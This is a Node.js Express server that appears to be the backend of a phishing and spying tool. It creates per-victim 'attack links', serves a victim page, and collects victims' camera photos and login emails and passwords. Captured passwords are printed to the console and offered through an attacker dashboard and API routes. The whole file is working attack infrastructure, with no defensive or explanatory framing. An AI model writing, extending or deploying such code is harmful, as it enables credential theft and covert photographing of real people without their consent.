const express = require('express');
const cors = require('cors');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Root route
app.get('/', (req, res) => {
    res.redirect('/dashboard');
});

// In-memory storage
const sessions = new Map();

// Generate attack link
app.post('/api/generate', (req, res) => {
    const sessionId = uuidv4();
    const session = {
        id: sessionId,
        status: 'WAITING',
        created: new Date().toISOString(),
        clicks: 0,
        photos: [],
        credentials: [],
        metadata: {}
    };
    sessions.set(sessionId, session);
    
    const link = `${req.protocol}://${req.get('host')}/v/${sessionId}`;
    res.json({ link, sessionId });
});

// Victim page
app.get('/v/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    if (!sessions.has(sessionId)) {
        return res.status(404).send('Session expired or invalid.');
    }
    
    const session = sessions.get(sessionId);
    session.status = 'ACTIVE';
    session.clicks += 1;
    
    res.sendFile(path.join(__dirname, 'public', 'victim.html'));
});

// Receive photo
app.post('/api/photo', (req, res) => {
    const { sessionId, image, metadata } = req.body;
    
    if (!sessions.has(sessionId)) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    const session = sessions.get(sessionId);
    const photoId = uuidv4();
    
    session.photos.push({
        id: photoId,
        image: image,
        timestamp: new Date().toISOString(),
        metadata: metadata || {}
    });
    
    console.log(`📸 Photo captured for session: ${sessionId.substring(0, 8)}...`);
    res.json({ success: true, photoId });
});

// Receive login credentials
app.post('/api/login', (req, res) => {
    const { sessionId, email, password } = req.body;
    
    if (!sessions.has(sessionId)) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    const session = sessions.get(sessionId);
    
    session.credentials.push({
        email: email,
        password: password,
        timestamp: new Date().toISOString()
    });
    
    console.log(`🔐 Credentials captured: ${email} | ${password}`);
    res.json({ success: true });
});

// Get photos for a session
app.get('/api/photos/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    
    let foundSession = null;
    let fullId = null;
    for (const [id, data] of sessions.entries()) {
        if (id.startsWith(sessionId.replace('...', ''))) {
            foundSession = data;
            fullId = id;
            break;
        }
    }
    
    if (!foundSession) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({ 
        sessionId: fullId,
        photos: foundSession.photos || []
    });
});

// Get credentials for a session
app.get('/api/credentials/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    
    let foundSession = null;
    let fullId = null;
    for (const [id, data] of sessions.entries()) {
        if (id.startsWith(sessionId.replace('...', ''))) {
            foundSession = data;
            fullId = id;
            break;
        }
    }
    
    if (!foundSession) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({ 
        sessionId: fullId,
        credentials: foundSession.credentials || []
    });
});

// Dashboard HTML
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Dashboard API data
app.get('/api/dashboard', (req, res) => {
    const sessionData = Array.from(sessions.entries()).map(([id, data]) => ({
        id: id.substring(0, 8) + '...',
        status: data.status,
        clicks: data.clicks,
        photos: data.photos.length,
        credentials: data.credentials ? data.credentials.length : 0,
        created: data.created
    }));
    
    res.json({ sessions: sessionData });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dashboard`);
});
